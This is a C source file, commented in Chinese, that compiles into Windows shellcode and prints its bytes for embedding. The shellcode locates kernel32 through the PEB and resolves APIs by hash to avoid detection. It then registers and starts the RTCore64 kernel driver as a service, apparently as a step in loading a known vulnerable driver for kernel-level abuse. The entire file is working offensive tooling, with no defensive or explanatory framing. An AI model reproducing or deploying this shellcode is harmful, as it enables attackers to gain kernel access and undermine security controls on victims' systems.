#include <Windows.h>
#include <winternl.h>
#include <stdio.h>


/*
* 编译说明：
* 
* 编译器务必使用Clang
* 配置属性 -> C/C++ -> 优化 -> 优化 -> 最大优化(优选大小)(/O1)
* 配置属性 -> C/C++ -> 代码生成 -> 安全检查 -> 禁用安全检查
* 配置属性 -> C/C++ -> 命令行 -> 其他选项 -> -mno-sse
*/


/*
* 函数哈希
*/

#define HASH_LoadLibraryA 0x071d2c76
#define HASH_GetProcAddress 0xc2cbc15a

/*
* 内联函数
*/

__forceinline PPEB GetCurrentPeb() {

#ifdef _WIN64 // x64
    PTEB Teb = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
#else // x86
    PTEB Teb = (PTEB)__readfsdword(offsetof(NT_TIB, Self));
#endif
    return Teb->ProcessEnvironmentBlock;
}

__forceinline HMODULE GetKernel32Base() {

    PPEB Peb = GetCurrentPeb();
    PLIST_ENTRY ListHead = Peb->Ldr->InMemoryOrderModuleList.Flink;
    PLIST_ENTRY CurrEntry = ListHead;

    do {
        PLDR_DATA_TABLE_ENTRY Ldr = CONTAINING_RECORD(CurrEntry->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (*((DWORD*)&(Ldr->FullDllName.Buffer[20])) == 0x45004b &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[22])) == 0x4e0052 &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[24])) == 0x4c0045 &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[26])) == 0x320033)
            return (HMODULE)Ldr->DllBase;

        else if (*((DWORD*)&(Ldr->FullDllName.Buffer[20])) == 0x65006b &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[22])) == 0x6e0072 &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[24])) == 0x6c0065 &&
            *((DWORD*)&(Ldr->FullDllName.Buffer[26])) == 0x320033)
            return (HMODULE)Ldr->DllBase;

        CurrEntry = CurrEntry->Flink;

    } while (CurrEntry != ListHead);

    return NULL;
}

__forceinline DWORD HashKey(CHAR* key) {

    DWORD Hash = 0;
    while (*key) {
        Hash = (Hash << 5) + Hash + *key++;
    }
    return Hash;
}

/*
* 函数声明
*/

HMODULE GetKernel32Base();
PVOID GetProcAddrByHash(HMODULE Module, DWORD Hash);

/*
* Shellcode 实现
*/

VOID Shellcode() {

    //
    // 函数声明
    //
    typedef HMODULE(WINAPI* pfnLoadLibraryA)(_In_ LPCSTR lpLibFileName);
    typedef FARPROC(WINAPI* pfnGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
    typedef VOID(WINAPI* pfnExitThread)(_In_ DWORD dwExitCode);
    typedef VOID(WINAPI* pfnExitProcess)(_In_ UINT uExitCode);

    typedef SC_HANDLE(WINAPI* pfnOpenSCManagerA)(_In_opt_ LPCSTR lpMachineName, _In_opt_ LPCSTR lpDatabaseName, _In_ DWORD dwDesiredAccess);
    typedef SC_HANDLE(WINAPI* pfnCreateServiceA)(
        _In_        SC_HANDLE    hSCManager,
        _In_        LPCSTR     lpServiceName,
        _In_opt_    LPCSTR     lpDisplayName,
        _In_        DWORD        dwDesiredAccess,
        _In_        DWORD        dwServiceType,
        _In_        DWORD        dwStartType,
        _In_        DWORD        dwErrorControl,
        _In_opt_    LPCSTR     lpBinaryPathName,
        _In_opt_    LPCSTR     lpLoadOrderGroup,
        _Out_opt_   LPDWORD      lpdwTagId,
        _In_opt_    LPCSTR     lpDependencies,
        _In_opt_    LPCSTR     lpServiceStartName,
        _In_opt_    LPCSTR     lpPassword
        );
    typedef BOOL(WINAPI* pfnStartServiceA)(
        _In_            SC_HANDLE            hService,
        _In_            DWORD                dwNumServiceArgs,
        _In_reads_opt_(dwNumServiceArgs) LPCSTR* lpServiceArgVectors);
    typedef BOOL(WINAPI* pfnCloseServiceHandle)(_In_ SC_HANDLE hSCObject);

    //
    // 变量声明
    //
    HMODULE Kernel32;
    pfnLoadLibraryA LoadLibraryA;
    pfnGetProcAddress GetProcAddress;

    //
    // 主体
    //
    Kernel32 = GetKernel32Base();

    LoadLibraryA = (pfnLoadLibraryA)GetProcAddrByHash(Kernel32, HASH_LoadLibraryA);
    GetProcAddress = (pfnGetProcAddress)GetProcAddrByHash(Kernel32, HASH_GetProcAddress);

    // 获取 ExitThread 函数
    BYTE aExitThread[] = { "ExitThread" };
    pfnExitThread ExitThread = (pfnExitThread)GetProcAddress(Kernel32, (LPCSTR)aExitThread);

    // 载入 Advapi32 模块
    BYTE ModuleName[] = { "Advapi32.dll" };
    HMODULE Advapi32 = LoadLibraryA((LPCSTR)ModuleName);
    if (Advapi32 == NULL) {
        ExitThread(0);
        return;
    }

    // 获取 OpenSCManagerA 函数
    BYTE aOpenSCManagerA[] = { "OpenSCManagerA" };
    pfnOpenSCManagerA OpenSCManagerA = (pfnOpenSCManagerA)GetProcAddress(Advapi32, (LPCSTR)aOpenSCManagerA);
    if (OpenSCManagerA == NULL) {
        ExitThread(0);
        return;
    }

    // 获取 CreateServiceA 函数
    BYTE aCreateServiceA[] = { "CreateServiceA" };
    pfnCreateServiceA CreateServiceA = (pfnCreateServiceA)GetProcAddress(Advapi32, (LPCSTR)aCreateServiceA);
    if (CreateServiceA == NULL) {
        ExitThread(0);
        return;
    }

    // 获取 StartServiceA 函数
    BYTE aStartServiceA[] = { "StartServiceA" };
    pfnStartServiceA StartServiceA = (pfnStartServiceA)GetProcAddress(Advapi32, (LPCSTR)aStartServiceA);
    if (StartServiceA == NULL) {
        ExitThread(0);
        return;
    }

    // 获取 CloseServiceHandle 函数
    BYTE aCloseServiceHandle[] = { "CloseServiceHandle" };
    pfnCloseServiceHandle CloseServiceHandle = (pfnCloseServiceHandle)GetProcAddress(Advapi32, (LPCSTR)aCloseServiceHandle);
    if (CloseServiceHandle == NULL) {
        ExitThread(0);
        return;
    }

    // 创建服务
    SC_HANDLE SCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (SCManager == NULL) {
        ExitThread(0);
        return;
    }

    BYTE aServiceName[] = { "RTCore64" };
    BYTE aPath[] = { "C:\\RTCore64\\RTCore64.sys" };
    SC_HANDLE Service = CreateServiceA(
        SCManager,
        (LPCSTR)aServiceName,
        (LPCSTR)aServiceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        (LPCSTR)aPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    
    if (Service == NULL) {
        CloseServiceHandle(SCManager);
        ExitThread(0);
        return;
    }

    // 启动服务
    StartServiceA(Service, 0, NULL);

    // 清理
    CloseServiceHandle(SCManager);
    CloseServiceHandle(Service);
    ExitThread(0);
}

PVOID GetProcAddrByHash(HMODULE Module, DWORD Hash) {

    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Module;
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)Module + DosHeader->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY Export = (PIMAGE_EXPORT_DIRECTORY)((UINT_PTR)Module + NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* AddressOfNames = (DWORD*)((UINT_PTR)Module + Export->AddressOfNames);
    DWORD* AddressOfFunctions = (DWORD*)((UINT_PTR)Module + Export->AddressOfFunctions);

    DWORD Ordinal;
    for (Ordinal = 0; Ordinal < Export->NumberOfNames; Ordinal++) {
        CHAR* Name = (CHAR*)((UINT_PTR)Module + AddressOfNames[Ordinal]);
        if (HashKey(Name) == Hash)
            break;
    }

    if (Ordinal != Export->NumberOfNames) {
        WORD Index = ((WORD*)((UINT_PTR)Module + Export->AddressOfNameOrdinals))[Ordinal];
        PVOID Function = (PVOID)((UINT_PTR)Module + AddressOfFunctions[Index]);
        return Function;
    }

    return NULL;
}

VOID End() {
    return;
}

int main() {

    INT Size = (UINT_PTR)End - (UINT_PTR)Shellcode;
    BYTE* Buffer = (BYTE*)Shellcode;

    printf("\"");
    for (int i = 0; i < Size; i++) {

        if (i != 0 && (i % 16) == 0)
            printf("\"\n\"");

        printf("\\x%.2X", Buffer[i]);
    }
    printf("\"");

    return 0;
}
